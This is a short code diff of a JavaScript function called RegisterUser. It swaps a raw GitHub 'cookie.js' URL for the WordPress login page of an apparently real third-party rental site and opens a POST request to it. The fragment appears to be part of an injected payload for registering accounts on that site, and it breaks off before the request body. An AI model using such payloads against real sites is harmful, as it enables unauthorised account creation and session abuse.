@@ -1,6 +1,6 @@
 function RegisterUser(){
 
-    var url = "https://raw.githubusercontent.com/AssassinUKG/testing/main/cookie.js";
+    var url = "https://www.irinarentals.com/wp-login.php";
        
     xhr = new XMLHttpRequest();
     xhr.open("POST", url);
